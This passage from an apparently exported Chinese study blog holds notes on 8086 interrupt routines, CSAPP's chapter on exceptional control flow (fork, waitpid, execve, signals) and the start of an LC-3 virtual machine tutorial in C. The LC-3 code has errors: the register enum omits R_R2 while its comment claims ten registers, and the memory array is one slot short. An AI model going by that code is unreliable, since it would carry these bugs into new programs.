sub4s:push cx</span><br><span class="line">          mov cx,160</span><br><span class="line">          rep movsb         ;si和di的增加在此处进行</span><br><span class="line">          pop cx</span><br><span class="line">          loop sub4s</span><br><span class="line">          mov cx,80</span><br><span class="line">          mov si,0</span><br><span class="line">   sub4s1:mov byte ptr [160*24+si],&#x27; &#x27;</span><br><span class="line">          add si,2</span><br><span class="line">          loop sub4s1</span><br><span class="line">          pop ds</span><br><span class="line">          pop es</span><br><span class="line">          pop di</span><br><span class="line">          pop si</span><br><span class="line">          pop cx</span><br><span class="line">          ret</span><br><span class="line">int7chend:nop</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<p>其实我们这里使用table的方式有点麻烦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; table dw offset sub1-offset int7ch+200h</span><br><span class="line">           dw offset sub2-offset int7ch+200h</span><br><span class="line">           dw offset sub3-offset int7ch+200h</span><br><span class="line">           dw offset sub4-offset int7ch+200h</span><br><span class="line">;call word ptr cs:[bx+202h] </span><br><span class="line">;我们把上面这些替换成下面的</span><br><span class="line">;在int7ch前面加上 org 200h 表示偏移地址从200h处开始</span><br><span class="line">  table dw sub1,sub2,sub3,sub4</span><br><span class="line">  call word ptr table[bx]</span><br></pre></td></tr></table></figure>

<p>没加那个org 200h是不行的</p>
<p>org 200H		;表示下一条地址从偏移地址200H开始，和安装后的偏移地址相同，若没有org 200H，中断例程安装后，标号代表的地址改变了，和之前编译器编译的有所区别 </p>
<p>如果我们不加上org，那么这个table的偏移地址就是本程序中的偏移地址.可是为什么sub1，这种标号还是以200h为准的偏移？应该是因为，sub1作为一个标号能正确的复制过去，table作为一个标号复制不过去，是因为table是比较抽象的？隐式的？</p>
<p>下面这张图是org 200h的，【bx+202h】</p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/Untitled.png"></p>
<p>这张图是没有org的，我们可以看到下面的【bx+36h】，加的table的偏移地址</p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/Untitled2.png"></p>
<h2 id="疑惑-1"><a href="#疑惑-1" class="headerlink" title="疑惑"></a>疑惑</h2><p>为什么同样是标号，table复制过去是安装程序中的地址，sub传过去的就是200h的偏移地址？？？我觉得合理的解释是这个sub1s跟着一起复制了过去，就是第二个sub1s其实是随着第一个sub1s的变化而变化的。在程序执行完之后，主程序所占的内存被其他数据覆盖，之前的sub1消失，这么理解的话，标号代表的不一定是个固定不变的地址。</p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230412020235.png"></p>
<h1 id="第十七章-使用BIOS进行键盘输入和磁盘读写"><a href="#第十七章-使用BIOS进行键盘输入和磁盘读写" class="headerlink" title="第十七章 使用BIOS进行键盘输入和磁盘读写"></a>第十七章 使用BIOS进行键盘输入和磁盘读写</h1><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>第八章-异常控制流</title>
    <url>/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/</url>
    <content><![CDATA[<p><strong>控制流</strong> 简单来讲就是程序执行期间代码执行的顺序和方式，即程序从一个语句到另一个语句的跳转和执行顺序。</p>
<span id="more"></span>![](第八章-异常控制流/QQ截图20230607165922.png)

<p><strong>异常控制流</strong>（Exception Control Flow）是指程序执行中发生的异常事件所导致的控制流改变。异常事件可以是许多不同类型的错误或意外情况，例如除数为零、内存访问违规、IO错误等等。</p>
<p>当一个异常事件发生时，程序的当前控制流会停止并开始执行异常处理程序。异常处理程序可以是开发者预先编写好的一些代码，也可以是操作系统提供的默认的异常处理程序。当异常处理程序结束后，程序会返回到发生异常的位置继续执行。</p>
<p>为什么要学习ECF：</p>
<ul>
<li>理解ECF帮助理解重要的系统概念。</li>
<li>有助于我们理解应用程序是如何与操作系统交互</li>
<li>有助于我们编写有趣的新型应用程序</li>
<li>有助于理解并发</li>
<li>有助于理解软件异常如何工作</li>
</ul>
<h3 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h3><p><strong>异常是控制流的突变，用来相应处理器状态的某些变化。</strong><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230907164350.png"></p>
<p>举个例子：我在玩手机，女朋友喊我去吃饭，那我就要放下手头的工作去配女朋友吃饭，吃完饭我可以继续玩手机，也可以去干别的事情。</p>
<p>在这个例子中，<strong>正常的控制流</strong>就是指我一直玩手机，女朋友喊我就是<strong>控制流突变</strong>，处理完异常事件会发生一下三种情况：</p>
<ol>
<li>处理程序将控制返回给当前指令（我继续玩手机）</li>
<li>处理程序返回给如果没有异常将会执行的下一条指令（可能去睡觉）</li>
<li>处理程序终止被终端的程序，也就是g了。</li>
</ol>
<h4 id="异常号"><a href="#异常号" class="headerlink" title="异常号"></a>异常号</h4><p>系统中每种类型的一场都分配了一个唯一的非负整数的异常号。在系统启动时操作系统反配合初始化一张成为异常表的跳转表，该表存放的是异常处理程序的地址。异常表的起始地址放在一个叫做异常表基地址寄存器的特殊CPU寄存器里。<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230907170207.png"></p>
<h4 id="异常的类别"><a href="#异常的类别" class="headerlink" title="异常的类别"></a>异常的类别</h4><p>四类：<strong>中断</strong>、<strong>陷阱</strong>、<strong>故障</strong>、<strong>终止</strong><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230907165608.png"></p>
<h5 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h5><p>中断是异步的，是来自处理器外部的I&#x2F;O设备的<strong>信号</strong>的结果。在指令执行过程中，中断引脚的电压变高（这是一个信号），当前指令结束后，处理器注意到中断引脚电压变高，于是从系统总线读取异常号，从而触发中断。<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230907170706.png"></p>
<h5 id="陷阱和系统调用"><a href="#陷阱和系统调用" class="headerlink" title="陷阱和系统调用"></a>陷阱和系统调用</h5><p><strong>陷阱是有意的异常</strong>，是执行一条指令的结果（上面的中断就不是某条指令的结果）。陷阱最重要的用途是在用户程序和内核之间提供一个像过程一样的接口，叫做系统调用。读文件（read）、创建新进程（fork）等都是内核提供的服务，用户程序通过<code>syscall n</code>指令来请求服务n，这条指令会导致一个道异常处理程序的陷阱。</p>
<h5 id="故障"><a href="#故障" class="headerlink" title="故障"></a>故障</h5><p>故障由错误情况引起，可能被故障处理程序修正。</p>
<h5 id="终止"><a href="#终止" class="headerlink" title="终止"></a>终止</h5><p>终止是不可恢复的致命错误造成的结果，终止处理程序从不将控制返回给应用程序。</p>
<h4 id="linux系统调用"><a href="#linux系统调用" class="headerlink" title="linux系统调用"></a>linux系统调用</h4><p>使用syscall指令可以调用任何系统调用，然而我们更多使用的是一些封装好的系统级函数。<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909013737.png"></p>
<p>来看一下系统级函数的实际应用<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909013802.png"></p>
<p>对应的汇编内容为<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909013850.png"></p>
<p>可以看到，系统调用编号被放置在rax寄存器，rdi,rsi,rdx,r10,r8,r9依次传递第一二至第六个参数。</p>
<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>进程的经典定义是一<strong>个执行中的程序的实例</strong>。系统中的每个程序都运行在某个进程的上下文中。<strong>上下文</strong>是由程序正确运行所需的状态组成的。状态包括存放在内存中的程序的代码和数据，它的栈、通用目的寄存器的内容、程序计数器、环境变量以及打开文件描述符的集合。得益于进程这一抽象，我们的程序好像是系统中唯一运行的程序，好像独占的使用处理器和内存。</p>
<h4 id="逻辑控制流"><a href="#逻辑控制流" class="headerlink" title="逻辑控制流"></a>逻辑控制流</h4><p><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909014752.png"></p>
<p>PC的值组成的序列叫做逻辑控制流，如上图所示共有三个逻辑流即</p>
<p>PCa1、PCa2；</p>
<p>PCb；</p>
<p>PCc1、PCc2；</p>
<p>进程是轮流使用处理器的，每个进程执行它流的一部分然后被抢占（暂时挂起），然后处理其他进程。</p>
<h4 id="并发流"><a href="#并发流" class="headerlink" title="并发流"></a>并发流</h4><p>有交替的逻辑流就是并发流，A和B并发，A和C并发，B和C不是并发，因为B进程结束的时候C进程才开始，两个进程并没有时间上的重合。</p>
<h3 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h3><p>每个进程都有一个唯一的整数进程ID（PID）。getpid函数返回调用进程的PID，getppid函数返回它的父进程的PID（创建调用进程的进程）。</p>
<h4 id="创建和终止进程"><a href="#创建和终止进程" class="headerlink" title="创建和终止进程"></a>创建和终止进程</h4><p>进程的三种状态：运行、停止、终止。</p>
<p>父进程可以通过fork函数创建一个新的运行的子进程。子进程和父进程几乎完全一样，最大的区别是他们具有不同的PID。fork函数被调用一次，却返回两次，一次返回父进程，一次返回给子进程。在父进程中fork返回创建的子进程的PID，在子进程中fork返回0。<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909020033.png"></p>
<p>这个程序可以帮助我们理解fork函数。fork之后产生了一个子进程，子进程和父进程的代码完全相同，但是子进程不是从头开始运行，而是从创建进程的下一条语句开始执行即红框圈中的部分，所以我们可以理解为红框所圈中的部分被执行了两次，一次是在子进程中，一次是在父进程中。在子进程中fork返回0，执行if语句里的内容，父进程中PID为正，执行下面的printf，所以得到<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909020535.png"></p>
<p>值得注意的是子进程和父进程被执行的顺序不是固定的，也就是可能在另一台机器甚至在这台机器再运行一遍程序都有可能先打印child。</p>
<p>子进程和父进程是<strong>共享文件</strong>的，在父进程调用fork时，stdout文件是打开的，指向屏幕，子进程继承了这个文件，因此它的输入也是指向屏幕的。</p>
<h4 id="回收子进程"><a href="#回收子进程" class="headerlink" title="回收子进程"></a>回收子进程</h4><p>当一个进程由于某种原因突然终止时，内核并不是立即把他从系统中清除。进程被保持在一种已终止的状态中直到它被父进程回收。当父进程回收子进程时内核将子进程的退出状态传递给父进程，然后抛弃，从此该进程就不存在了。</p>
<p>一个进程可以通过调用waitpid函数来等待它的子进程终止或停止。<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909021419.png"></p>
<p>在默认情况下（options&#x3D;0时），waiopid挂起<strong>调用进程</strong>（父进程）的执行，直到它的等待<strong>集合</strong>中的<strong>一个</strong>子进程终止。如果等待集合中的一个子进程再刚调用的时候已经终止了，那么waitpid立即返回。在以上两种情况下waitpid函数返回已终止的子进程的PID。</p>
<p><strong>集合成员</strong></p>
<ul>
<li>如果参数列表里的pid&gt;0,那么等待集合就是一个单独的子进程，进程id等于PID。</li>
<li>如果PID&#x3D;-1，那么等待集合就是由父进程的所有子进程组成的。</li>
</ul>
<p><strong>修改默认行为</strong></p>
<p><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909022520.png"></p>
<p><strong>检查回收子进程的退出状态</strong></p>
<p>如果statusp参数是非空的，也就是将第二个参数设置为了一个int的地址，那么waitpid函数将会在改地址处存放子进程的状态信息。如果不需要这些状态信息，填入NULL即可。<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909022934.png"></p>
<p>这里的退出状态为<code>exit n</code>中n。</p>
<p>来个例子理解一下</p>
<p><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909023058.png"></p>
<p>pid&#x3D;-1代表回收所有子进程，NULL代表不需要子进程的状态信息，options是默认的0。</p>
<p><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909023805.png"></p>
<h4 id="让进程休眠"><a href="#让进程休眠" class="headerlink" title="让进程休眠"></a>让进程休眠</h4><p><strong>sleep</strong>函数将一个进程挂起指定的时间（单位秒），如果请求时间量已经到了sleep返回0，否则返回还剩下的要休息的秒数，其实这两种属于同一种情况请求时间量到了，剩余休眠时长自然为0。</p>
<p><strong>pause</strong>函数让调用进程休眠，直到该进程接收到一个信号。</p>
<h4 id="加载并运行程序"><a href="#加载并运行程序" class="headerlink" title="加载并运行程序"></a>加载并运行程序</h4><p><strong>execve</strong>函数在当前进程的上下文中加载并运行一个新程序。新的进程继承原进程的PID。</p>
<p><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909024531.png"></p>
<p>filename是可执行文件，可以是名字也可以是路径。argv为参数列表，envp为环境变量列表，要注意这两个表都要以NULL结尾，默认环境变量为0。来个例子</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//execve.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span>*argv[]=&#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">        <span class="type">char</span>*envp[]=&#123;<span class="number">0</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I am process 1\n&quot;</span>);</span><br><span class="line">        execve(<span class="string">&quot;execve1&quot;</span>,argv,envp);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hhh&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//execve1.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I AM PROCESS 2\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909030353.png"></p>
<p>可以看到在execve函数执行完之后，原进程的代码就不再被执行了。</p>
<h3 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h3><p>一个信号就是一条小消息。他通知进程系统中发生了一个某种类型的事件。<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909031118.png"></p>
<p><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909031155.png"></p>
<p>可以看出，信号是异常的一种。</p>
<p><strong>信号表：</strong><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909165520.png"></p>
<h4 id="信号术语"><a href="#信号术语" class="headerlink" title="信号术语"></a>信号术语</h4><p>传送一个信号到达目的进程是由两个不同步骤组成的：</p>
<ul>
<li>发送信号。<strong>内核</strong>通过更新目的进程的上下文中的某个状态，发送一个信号给目的进程。发送信号的原因：1）内核检测到一个系统事件，如除零错误。2）一个进程调用了kill函数发送信号。</li>
<li>接收信号。当目的进程被内核强迫以某种形式对信号作出反应，他就接受了信号。</li>
</ul>
<h4 id="发送信号"><a href="#发送信号" class="headerlink" title="发送信号"></a>发送信号</h4><p>发送信号的机制基于<strong>进程组</strong>这一概念。</p>
<p><strong>进程组</strong>：每个进程都只属于一个进程组，进程组由一个正整数进程组ID标识。getpgrp函数返回当前进程的进程组。默认的，一个子进程和它的父进程同属于一个进程组，一个进程可以通过setpgid函数来改变自己或者其他进程的进程组。<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909143156.png"></p>
<p>该函数将进程pid的进程组改为gpid。特殊的，当pid为0，那么就使用当前进程的PID，如果gpid为0，那么就是用pid指定的进程的PID作为进程组的ID。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//进程15213</span></span><br><span class="line">setpgid（<span class="number">0</span>，<span class="number">0</span>）</span><br></pre></td></tr></table></figure>

<p>该函数会创建一个gpid为15213的进程组，并将进程15213加入到这个新的进程组中。</p>
<p><strong>1.使用 &#x2F;bin&#x2F;kill 程序发送信号</strong></p>
<p>&#x2F;bin&#x2F;kill程序可以向另外的进程发送任意的信号。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">linux&gt; </span><span class="language-bash">/bin/kill -9 15213</span></span><br></pre></td></tr></table></figure>

<p>实现的功能是发送信号9给进程15213。一个负的pid会导致信号被发送到进程组pid中的每个进程。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">linux&gt; </span><span class="language-bash">/bin/kill -9 -15213</span></span><br></pre></td></tr></table></figure>

<p>实现的功能是发送信号9给进程组15213中的每一个进程。</p>
<p><strong>2.从键盘发送信号</strong></p>
<p>Unix shell使用作业（job）这个抽象概念来表示为对一条命令行求值而创建的进程。在任何时刻，至多有一个前台作业和0或多个后台作业。job是一个或多个进程的集合。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls | sort</span><br></pre></td></tr></table></figure>

<p>键入该命令shell进程会创建一个由两个进程组成的前台作业，一个进程运行ls程序，另一个进程运行sort程序。shell为每个作业创建一个独立的进程组，进程组ID通常取自作业中父进程的一个。<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909145242.png"></p>
<p>在键盘上输入Ctrl+c会导致内核发送一个SIGINT信号到前台进程组的每个进程。默认情况下是终止前台作业。	Ctrl+z会发送一个信号到前台进程组的每个进程，默认情况下是停止（挂起）前台作业。</p>
<p><strong>3.使用kill函数发送信号</strong></p>
<p>进程通过调用kill函数发送信号给其他进程（包括他们自己）。<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909151028.png"></p>
<p>如果pid<strong>大于零</strong>，则kill函数发送信号sig给进程pid。如果pid<strong>等于零</strong>，kill函数发送信号给调用进程所在的进程组中的每个进程。如果pid<strong>小于零</strong>kill函数发送信号给进程组|pid|（pid的绝对值）中的每个进程。</p>
<p><strong>4.用alarm函数发送信号</strong></p>
<p><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909152543.png"></p>
<h4 id="接收信号"><a href="#接收信号" class="headerlink" title="接收信号"></a>接收信号</h4><p>当内核把进程从内核模式切换到用户模式时（从系统调用中返回或是完成了一次上下文切换），他会检查进程p的未被阻塞的<strong>待处理信号</strong>集合。如果这个集合为空那么内核将控制传递到p的逻辑控制流的下一条指令。如果集合非空，那么内核通常会选择从最小的信号k开始处理，强制进程p接收信号k。收到这个信号会触发进程采取某种行为，一旦完成，控制传递回逻辑控制流的下一条指令</p>
<p>每个信号类型都有一个预定义的默认行为：</p>
<ul>
<li>进程终止</li>
<li>进程终止并转储内存</li>
<li>进程停止直到被sigcont信号重启</li>
<li>进程忽略该信号</li>
<li>进程可以通过signal函数修改和信号相关联的默认行为<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230910024724.png"></li>
</ul>
<p><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230910024630.png"></p>
<p>配上这个程序解释一下<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230910024740.png"></p>
<p>开始运行的时候，调用了signal函数对信号SIGINT即中断信号（Ctrl+c）进行了自定义，也就是当接收到该信号时，会运行指定的程序sigint_handler，pause函数执行后，进程被挂起，此时我们按下Ctrl+c，得到的不是直接终止程序而是”Caught SIGINT”字符串然后再exit（0）。</p>
<h4 id="阻塞和解除阻塞信号"><a href="#阻塞和解除阻塞信号" class="headerlink" title="阻塞和解除阻塞信号"></a>阻塞和解除阻塞信号</h4><p>Linux提供阻塞信号的<strong>隐式</strong>和<strong>显式</strong>机制：</p>
<ul>
<li>隐式阻塞机制。内核默认阻塞任何当前处理程序正在处理信号类型的待处理的信号。说简单一点就是，如果当前进程就收到s信号并正在进行处理，此时就算再发出s信号进程也不予理会，此时的第二个s信号会被放到待处理信号集合中，当出现第三个信号s时，第三个信号s将直接被丢弃。</li>
<li>显示阻塞机制。通过<strong>sigprocmask</strong>函数和它的辅助函数明确的阻塞和解除阻塞选定的信号。</li>
</ul>
<p><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230910032207.png"></p>
<p>首先来看sigprocmask函数的三个参数，第一个<strong>how</strong>，规定函数如何改变当前阻塞信号集合。第二个参数set是信号集合。第三个参数oldset如果不为NULL的话，则保存之前的阻塞信号集合。</p>
<p>how的值：<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230910032859.png"></p>
<p>辅助函数：<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230910033038.png"></p>
<p>来个例子<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230910033131.png"></p>
<p>首先用了两个辅助函数，Sigemptyset函数将mask初始化为空集合，Sigaddset函数将信号SIGINT加入集合mask中。接下来的Sigprocmask函数使用BLOCK选项，指定将集合mask中的信号添加至阻塞集合，并将之前的阻塞集合保存到prev_mask之中。经过这么一设置我们的Ctrl+c将不再被处理。最后使用setmask方法将保存的prev_mask设置为阻塞列表，起到还原的作用。</p>
<p>未完待续。。。。。。</p>
]]></content>
      <tags>
        <tag>CSAPP</tag>
        <tag>ECF</tag>
      </tags>
  </entry>
  <entry>
    <title>编写虚拟机</title>
    <url>/2023/05/21/%E7%BC%96%E5%86%99%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
    <content><![CDATA[<p>注意，接下来要实现的虚拟机不是VMware那种有完整操作的虚拟机，而是JVM这种（解释器），更像一个翻译，可以将汇编语言转成高级语言。我们将用代码模拟计算机的硬件组件。</p>
<h2 id="虚拟机概念"><a href="#虚拟机概念" class="headerlink" title="虚拟机概念"></a>虚拟机概念</h2><p>简单来说虚拟机可以定义为一个软件程序，用来模拟一些其他物理机的功能。</p>
<span id="more"></span>

<h1 id="LC-3-架构"><a href="#LC-3-架构" class="headerlink" title="LC-3 架构"></a>LC-3 架构</h1><p>下面我们将实现LC-3虚拟机而不是x86计算机。与x56相比，LC-3 的指令集更 加简化，但现代 CPU 的主要思想其中都包括了。</p>
<h3 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h3><p>该计算机有65536（16bit）个内存空间，每个位置可以存储一个16bit的值。我们用数组来模拟内存。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint16_t</span>  memory[UINT16_MAX];     <span class="comment">//UINT16_MAX为16bit所能表示的最大值</span></span><br></pre></td></tr></table></figure>

<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>就像cpu的工作台，cpu要对一段数据进行处理则必须要将这段数据放到寄存器中。lc-3有十个寄存器，其中八个通用寄存器，一个程序计数器寄存器，一个条件标志位寄存器。</p>
<p>通用寄存器可以执行任何程序计算。计数器寄存器存放下一条指令的地址，条件寄存器记录上一次计算的正负符号。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> //10个寄存器，八个通用，一个程序计数器寄存器，一个条件寄存器</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	R_R0=<span class="number">0</span>,</span><br><span class="line">	R_R1,</span><br><span class="line">	R_R3,</span><br><span class="line">	R_R4,</span><br><span class="line">	R_R5, </span><br><span class="line">	R_R6, </span><br><span class="line">	R_R7,</span><br><span class="line">	R_PC,<span class="comment">//程序计数器寄存器，存储要执行的指令的地址</span></span><br><span class="line">	R_COND,</span><br><span class="line">	R_COUNT<span class="comment">//这个值为10，是下面reg数组的长度</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//用数组来表示这些寄存器</span></span><br><span class="line"><span class="type">uint16_t</span> reg[R_COUNT];</span><br></pre></td></tr></table></figure>

<h3 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h3><p>指令集是一组计算机处理器可以理解和执行的指令或操作码，机器语言则是指令的二进制形式。一条指令就是一条cpu命令，他告诉cpu执行什么任务。一条指令包括两个部分：1.操作码 2.参数</p>
<p>每个操作码（0000—1111）代表一种任务，每条指令16bit，左侧的4bit存储操作码，其余存储参数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span>//定义操作码   </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	OP_BR = <span class="number">0</span>,<span class="comment">//分支指令</span></span><br><span class="line">	OP_ADD,</span><br><span class="line">	OP_LD,<span class="comment">//LOAD 加载指令</span></span><br><span class="line">	OP_ST,<span class="comment">//STORE 存储指令</span></span><br><span class="line">	OP_JSR,<span class="comment">//JUMP REGISTER 寄存器跳转指令</span></span><br><span class="line">	OP_AND,<span class="comment">//BITWISE AND   按位 与</span></span><br><span class="line">	OP_LDR,<span class="comment">//LOAD REGISTER  寄存器装载指令</span></span><br><span class="line">	OP_STR,<span class="comment">//STORE REGISTER 寄存器存储指令</span></span><br><span class="line">	OP_RTI,<span class="comment">//UNUSED  未使用</span></span><br><span class="line">	OP_NOT,<span class="comment">//BITWISE NOT 按位非</span></span><br><span class="line">	OP_LDI,<span class="comment">//LOAD INDIRRCT 间接装载指令</span></span><br><span class="line">	OP_STI,<span class="comment">//STORE INDIRECT 间接存储指令</span></span><br><span class="line">	